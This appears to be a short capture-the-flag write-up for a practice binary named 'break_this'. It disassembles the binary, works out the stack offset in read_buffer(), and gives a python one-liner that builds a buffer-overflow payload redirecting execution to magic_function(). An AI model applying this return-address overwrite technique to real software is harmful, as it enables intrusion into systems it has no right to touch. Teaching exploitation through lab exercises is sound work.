# Writeup

- First use this command to scan the exec:
> ```Bash
> objdump -M intel -d break_this
> ```
- `magic_function()` is saved at `0x08048596`
- From the first 4 lines from `read_buffer()` we get that: `ebp` and `edi` get pushed on stack then the stack is extended by `0x54` = `84`
- So we must print `88 + 4 + 4 = 92` dummy characters `A` and then the address of `magic_function()` in little-endian encoding
- I will set `n` to a big enough value: `128`

> ``` Bash
> python -c 'print "128\n" + "A"*92 + "\x96\x85\x04\x08"' > payload
> ```